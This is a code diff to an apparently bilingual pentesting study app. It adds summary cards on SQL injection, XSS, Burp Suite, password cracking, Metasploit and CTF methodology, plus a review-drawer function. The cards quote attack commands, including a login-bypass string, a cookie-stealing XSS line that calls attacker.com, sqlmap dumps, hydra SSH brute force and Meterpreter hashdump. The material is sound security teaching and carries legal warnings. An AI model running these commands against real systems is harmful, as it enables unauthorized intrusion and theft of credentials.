-`<div class="callout callout-success"><strong>📋 SQL Injection — How and Why</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">input not sanitized in query</span></div><div class="cheat-item"><span class="cheat-key">query to return all records</span></div><div class="cheat-item"><span class="cheat-key">separates SQL from data</span></div><div class="cheat-item"><span class="cheat-key">SLEEP()</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 XSS — Cross-Site Scripting</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">victim does not need to click link</span></div><div class="cheat-item"><span class="cheat-key">server does not see the payload</span></div><div class="cheat-item"><span class="cheat-key">Content Security Policy</span></div><div class="cheat-item"><span class="cheat-key">session cookies</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Burp Suite — Web Testing</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">8080</span></div><div class="cheat-item"><span class="cheat-key">manually sending and resending requests</span></div><div class="cheat-item"><span class="cheat-key">automated fuzzing/brute force</span></div><div class="cheat-item"><span class="cheat-key">Insecure Direct Object Reference</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Password Attacks — Cracking Passwords</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">intentionally slow</span></div><div class="cheat-item"><span class="cheat-key">MD5</span></div><div class="cheat-item"><span class="cheat-key">variations on wordlist words</span></div><div class="cheat-item"><span class="cheat-key">leaked username:password pairs</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 Metasploit — Exploitation Framework</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">2003</span></div><div class="cheat-item"><span class="cheat-key">in memory only</span></div><div class="cheat-item"><span class="cheat-key">target IP</span></div><div class="cheat-item"><span class="cheat-key">attacker listening IP</span></div></div></div>`,
-`<div class="callout callout-success"><strong>📋 CTF — Practice & Learning</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Capture The Flag</span></div><div class="cheat-item"><span class="cheat-key">machines to hack with flags</span></div><div class="cheat-item"><span class="cheat-key">beginners-intermediate with guided rooms</span></div><div class="cheat-item"><span class="cheat-key">flag{...} / CTF{...}</span></div></div></div>`
+`<div class="sum-block"><div class="sum-block-title">🐉 Kali Linux — What and Why</div>
+<div class="sum-row"><span class="sum-k">Kali Linux</span><span class="sum-v">Debian-based Linux by Offensive Security. 600+ pre-installed security tools. Not for daily use — exclusively for penetration testing and security research.</span></div>
+<div class="sum-row"><span class="sum-k">Why Kali?</span><span class="sum-v">Tools pre-installed. Root mode available. Kernel tuned for network monitoring. Every saved setup hour = more learning time.</span></div>
+<div class="sum-row"><span class="sum-k">Key tools</span><span class="sum-v"><code>nmap</code>, <code>metasploit</code>, <code>burpsuite</code>, <code>wireshark</code>, <code>hashcat</code>, <code>sqlmap</code>, <code>aircrack-ng</code>.</span></div>
+<div class="sum-row"><span class="sum-k">rockyou.txt</span><span class="sum-v">14M real passwords from 2009 RockYou breach. At <code>/usr/share/wordlists/rockyou.txt</code>. Most used attack wordlist.</span></div>
+<div class="sum-row"><span class="sum-k">Metasploit DB</span><span class="sum-v"><code>service postgresql start</code> → <code>msfdb init</code>. Save hosts/services/vulns between sessions. <code>db_nmap</code> logs directly into MSF.</span></div>
+<div class="sum-danger">⚠️ Without written permission — any scanning/testing is a criminal offense. VulnHub, HackTheBox, TryHackMe = legal practice options.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔍 Reconnaissance — Fundamentals</div>
+<div class="sum-row"><span class="sum-k">Passive Recon</span><span class="sum-v">Gathering info <strong>without sending packets</strong>. Target unaware. Sources: Google, LinkedIn, Shodan, WHOIS, DNS records, Wayback Machine, GitHub leaks.</span></div>
+<div class="sum-row"><span class="sum-k">Active Recon</span><span class="sum-v">Sending packets directly — <strong>detectable</strong>. Port scanning, banner grabbing, OS fingerprinting. Visible in IDS/IPS. Requires permission.</span></div>
+<div class="sum-row"><span class="sum-k">OSINT</span><span class="sum-v">Open Source Intelligence — public sources only. SSL certs, DNS, LinkedIn, GitHub leaks. Often enough to build full target profile.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🛠️ Tools</div>
+<div class="sum-row"><span class="sum-k"><code>nmap -sV -sC -p- target</code></span><span class="sum-v"><code>-sV</code>=versions, <code>-sC</code>=scripts, <code>-p-</code>=all ports. <code>-sS</code>=SYN scan. <code>-O</code>=OS detection.</span></div>
+<div class="sum-row"><span class="sum-k">Shodan.io</span><span class="sum-v">Search engine for internet-connected devices. <code>org:"company"</code>, <code>port:22 country:US</code>.</span></div>
+<div class="sum-row"><span class="sum-k">Zone Transfer</span><span class="sum-v"><code>dig axfr @ns1.domain.com domain.com</code> — if misconfigured, exposes all subdomains.</span></div>
+<div class="sum-tip">💡 Recon order: WHOIS → DNS → LinkedIn/Shodan → Zone Transfer → nmap top ports → full scan → version detection.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">💉 SQL Injection — Basics</div>
+<div class="sum-row"><span class="sum-k">What is SQLi?</span><span class="sum-v">User input inserted directly into SQL <strong>without sanitization</strong>. Attacker injects SQL changing the query. Enables: data read, auth bypass, sometimes RCE.</span></div>
+<div class="sum-row"><span class="sum-k">Classic example</span><span class="sum-v"><code>' OR '1'='1</code> in login form → WHERE always true → authentication bypassed.</span></div>
+<div class="sum-row"><span class="sum-k">Prepared Statements</span><span class="sum-v"><code>SELECT * FROM users WHERE user=?</code>. Input treated as data, never SQL. Eliminates SQLi completely.</span></div>
+<div class="sum-row"><span class="sum-k">SQLi Types</span><span class="sum-v"><strong>Union-based</strong>: merge results with UNION SELECT. <strong>Boolean-based Blind</strong>: different page per true/false. <strong>Time-based</strong>: <code>SLEEP(5)</code> delay = true.</span></div>
+<div class="sum-row"><span class="sum-k">sqlmap</span><span class="sum-v"><code>sqlmap -u "url?id=1" --dbs</code> → <code>-D db -T users --dump</code>. Automates detection and exploitation.</span></div>
+<div class="sum-danger">⚠️ Equifax 2017: 147M records. Yahoo 2013: 3 billion accounts. Still OWASP Top 3 in 2025.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🕷️ XSS — Cross-Site Scripting</div>
+<div class="sum-row"><span class="sum-k">What is XSS?</span><span class="sum-v">Injecting malicious JavaScript into pages shown to other users. Script runs in victim's browser with their session and cookies.</span></div>
+<div class="sum-row"><span class="sum-k">Reflected XSS</span><span class="sum-v">Payload reflected immediately in response. Victim must click malicious URL. Common in search boxes, error messages.</span></div>
+<div class="sum-row"><span class="sum-k">Stored XSS</span><span class="sum-v"><strong>Most dangerous.</strong> Payload saved in DB, shown to everyone. No click needed from victim.</span></div>
+<div class="sum-row"><span class="sum-k">DOM-based XSS</span><span class="sum-v">Processed in browser only. Exploits JS reading from DOM directly (<code>innerHTML</code>, <code>location.hash</code>).</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">💥 Impact and Defenses</div>
+<div class="sum-row"><span class="sum-k">Session Hijacking</span><span class="sum-v"><code>new Image().src='https://attacker.com/?c='+document.cookie</code> → steals session → attacker logs in as victim.</span></div>
+<div class="sum-row"><span class="sum-k">HttpOnly Cookie</span><span class="sum-v"><code>Set-Cookie: session=abc; HttpOnly</code> → JS can't read it → eliminates XSS cookie theft.</span></div>
+<div class="sum-row"><span class="sum-k">Content Security Policy</span><span class="sum-v"><code>script-src 'self'</code> → only same-domain scripts execute.</span></div>
+<div class="sum-row"><span class="sum-k">Output Encoding</span><span class="sum-v">Encode all user input in HTML: <code>&lt;</code> → <code>&amp;lt;</code>. Browser displays as text, doesn't run.</span></div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔧 Burp Suite — What it is</div>
+<div class="sum-row"><span class="sum-k">Burp Suite</span><span class="sum-v">Most popular web app security testing platform. Intercepts, analyzes, modifies HTTP/S. Community = free, Pro = $449/year.</span></div>
+<div class="sum-row"><span class="sum-k">Setup</span><span class="sum-v">Proxy on port 8080. Browser traffic → Burp → server. Install Burp CA cert for HTTPS interception.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚙️ Key Tools</div>
+<div class="sum-row"><span class="sum-k">Proxy → Intercept</span><span class="sum-v">Stop every request. View all parameters, modify, forward or drop.</span></div>
+<div class="sum-row"><span class="sum-k">Repeater</span><span class="sum-v">Send request manually with modifications. Change → send → analyze response.</span></div>
+<div class="sum-row"><span class="sum-k">Intruder</span><span class="sum-v">Automated fuzzing. Mark §position§, replace with wordlist. Sniper / Cluster Bomb.</span></div>
+<div class="sum-row"><span class="sum-k">Decoder</span><span class="sum-v">Convert Base64, URL, HTML encoding. Essential for cookies, JWTs, API params.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🎯 IDOR</div>
+<div class="sum-row"><span class="sum-k">What is IDOR?</span><span class="sum-v">Access another user's resource by changing an ID. <code>/api/invoice/12345</code> → 12346 = someone else's data. Auth done, authorization not.</span></div>
+<div class="sum-row"><span class="sum-k">Finding with Burp</span><span class="sum-v">Intercept → Repeater → change IDs. Intruder with number range. Check response size/content.</span></div>
+<div class="sum-tip">💡 Always install Burp CA cert. Firefox → Settings → Certificates → Import → burp_ca.der.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🔑 Password Attacks — Fundamentals</div>
+<div class="sum-row"><span class="sum-k">Hashing vs Encryption</span><span class="sum-v"><strong>Hash</strong>: one-way, irreversible. <strong>Encryption</strong>: two-way, decryptable. MD5/SHA1 not secure for passwords — too fast.</span></div>
+<div class="sum-row"><span class="sum-k">bcrypt / Argon2</span><span class="sum-v">Intentionally slow with configurable work factor. bcrypt round 12 = ~100ms/hash = 10/sec. Includes salt. Resists brute force.</span></div>
+<div class="sum-row"><span class="sum-k">Salt</span><span class="sum-v">Random value added before hashing. Same password → different hash per user. Eliminates Rainbow Tables.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚔️ Attack Methods &amp; Tools</div>
+<div class="sum-row"><span class="sum-k">Dictionary Attack</span><span class="sum-v"><code>hashcat -m 0 hash.txt rockyou.txt</code>. Fast, effective for common passwords.</span></div>
+<div class="sum-row"><span class="sum-k">Rule-based Attack</span><span class="sum-v"><code>hashcat -r rules/best64.rule</code>. Transforms wordlist: adds numbers, substitutes chars. Catches "Password1!".</span></div>
+<div class="sum-row"><span class="sum-k">hashcat</span><span class="sum-v">GPU-based. RTX 4090: 300B MD5/sec. <code>-m 0</code>=MD5, <code>-m 3200</code>=bcrypt.</span></div>
+<div class="sum-row"><span class="sum-k">hydra</span><span class="sum-v">Online brute force: SSH, FTP, HTTP, RDP. <code>hydra -l admin -P rockyou.txt ssh://target</code>.</span></div>
+<div class="sum-tip">💡 Run <code>hashid</code> to identify hash type first. MD5 = seconds. bcrypt round 12 = hours-days on RTX 4090.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🚀 Metasploit — Fundamentals</div>
+<div class="sum-row"><span class="sum-k">Metasploit Framework</span><span class="sum-v">Most popular exploitation framework. 2,300+ exploits and 500+ payloads. Community = free.</span></div>
+<div class="sum-row"><span class="sum-k">Exploit vs Payload</span><span class="sum-v"><strong>Exploit</strong>: leverages a vulnerability. <strong>Payload</strong>: runs after success — reverse shell, meterpreter. Combined = full exploitation chain.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">⚙️ Key Commands</div>
+<div class="sum-row"><span class="sum-k">Workflow</span><span class="sum-v"><code>search eternalblue</code> → <code>use exploit/...</code> → <code>show options</code> → set RHOSTS/LHOST/LPORT → <code>run</code>.</span></div>
+<div class="sum-row"><span class="sum-k">Meterpreter</span><span class="sum-v">Memory-only payload. <code>sysinfo</code>, <code>getuid</code>, <code>hashdump</code>, <code>shell</code>, <code>getsystem</code>.</span></div>
+<div class="sum-row"><span class="sum-k">Reverse Shell</span><span class="sum-v">Target connects back to attacker — bypasses firewall. Generate with <code>msfvenom</code>.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🎯 Post-Exploitation</div>
+<div class="sum-row"><span class="sum-k">Privilege Escalation</span><span class="sum-v"><code>local_exploit_suggester</code> → suggests routes. <code>getsystem</code> tries multiple techniques automatically.</span></div>
+<div class="sum-row"><span class="sum-k">Pivoting</span><span class="sum-v"><code>route add 192.168.2.0/24 1</code> — attack internal systems through compromised machine.</span></div>
+<div class="sum-danger">⚠️ Metasploit signatures instantly recognized by EDR/AV/IDS on real targets. CTF machines are unprotected — production is not.</div>
+</div>`,
+`<div class="sum-block"><div class="sum-block-title">🏁 CTF — Capture The Flag</div>
+<div class="sum-row"><span class="sum-k">What is CTF?</span><span class="sum-v">Platforms for practicing offensive security. Goal: find <code>flag{...}</code> or <code>HTB{...}</code>. user.txt = user flag, root.txt = root flag.</span></div>
+<div class="sum-row"><span class="sum-k">HackTheBox (HTB)</span><span class="sum-v">Real machines to hack. Easy → Insane difficulty. Retired = writeups available. Active = no solution sharing.</span></div>
+<div class="sum-row"><span class="sum-k">TryHackMe</span><span class="sum-v">Guided rooms. Best for beginners. Paths: "Jr Pentester", "SOC Level 1".</span></div>
+<div class="sum-row"><span class="sum-k">VulnHub</span><span class="sum-v">Downloadable VMs for local practice. Free. No VPN needed.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🗺️ CTF Methodology</div>
+<div class="sum-row"><span class="sum-k">1. Enumeration</span><span class="sum-v"><code>nmap -sV -sC -p- target</code>. Ports, services, OS. Most critical step.</span></div>
+<div class="sum-row"><span class="sum-k">2. Web Enum</span><span class="sum-v"><code>gobuster dir -u http://target -w medium.txt</code>. <code>nikto -h target</code>.</span></div>
+<div class="sum-row"><span class="sum-k">3. Exploitation</span><span class="sum-v"><code>searchsploit apache 2.4.49</code>. ExploitDB, GitHub, GTFOBins.</span></div>
+<div class="sum-row"><span class="sum-k">4. PrivEsc</span><span class="sum-v"><code>sudo -l</code>, SUID: <code>find / -perm -4000 2>/dev/null</code>, linpeas.sh / winpeas.exe.</span></div>
+<div class="sum-row"><span class="sum-k">5. Flag</span><span class="sum-v"><code>cat /home/user/user.txt</code> and <code>cat /root/root.txt</code>. Submit on platform.</span></div>
+</div>
+<div class="sum-block"><div class="sum-block-title">🛠️ Essential Toolkit</div>
+<div class="sum-row"><span class="sum-k">Web</span><span class="sum-v">Burp Suite, gobuster/ffuf, nikto, sqlmap</span></div>
+<div class="sum-row"><span class="sum-k">Exploitation</span><span class="sum-v">Metasploit, searchsploit, pwntools, GTFOBins</span></div>
+<div class="sum-row"><span class="sum-k">Linux PrivEsc</span><span class="sum-v">linpeas.sh, sudo -l, SUID, cron jobs, pspy</span></div>
+<div class="sum-row"><span class="sum-k">Windows PrivEsc</span><span class="sum-v">winpeas.exe, PowerUp.ps1, BloodHound, mimikatz</span></div>
+<div class="sum-tip">💡 Always take notes — save every command, output, finding. Use Obsidian, CherryTree, or Notion.</div>
+</div>`
   ]
 }};
 var GAME_QS={},GAME_QS_EN={},QUIZZES={},QUIZZES_EN={},ILABS={},ILABS_EN={};
@@ -2983,5 +3292,44 @@ function updateStars(chId){
   const s=state.stars[chId]||0;
   el.textContent='⭐'.repeat(s)+'☆'.repeat(3-s);
 }
+
+
+// ── FULL REVIEW ──────────────────────────────────────────────
+function buildReviewContent() {
+  var Lc = L();
+  var cheats = Lc.cheat;
+  var names = Lc.names;
+  var html = '';
+  for (var i = 0; i < cheats.length; i++) {
+    var num = (i < 10 ? '0' : '') + i;
+    html += '<div class="review-chapter-block">' +
+      '<div class="review-chapter-title">' +
+        '<span class="review-chapter-num">' + num + '</span>' +
+        '<span class="review-chapter-name">' + names[i] + '</span>' +
+      '</div>' +
+      '<div class="review-chapter-body">' + cheats[i] + '</div>' +
+    '</div>';
+  }
+  return html;
+}
+function openReview() {
+  var total = (typeof TOTAL_CHAPTERS !== 'undefined') ? TOTAL_CHAPTERS : 8;
+  document.getElementById('reviewTitle').textContent = currentLang === 'he' ? '📚 סיכום מלא' : '📚 Full Review';
+  document.getElementById('reviewSub').textContent = currentLang === 'he'
+    ? 'כל ' + total + ' הפרקים בעמוד אחד'
+    : 'All ' + total + ' chapters on one page';
+  document.getElementById('reviewBody').innerHTML = buildReviewContent();
+  document.getElementById('reviewOverlay').classList.add('open');
+  document.getElementById('reviewDrawer').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+function closeReview() {
+  document.getElementById('reviewOverlay').classList.remove('open');
+  document.getElementById('reviewDrawer').classList.remove('open');
+  document.body.style.overflow = '';
+}
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeReview();
+});
 
 </script></body></html>
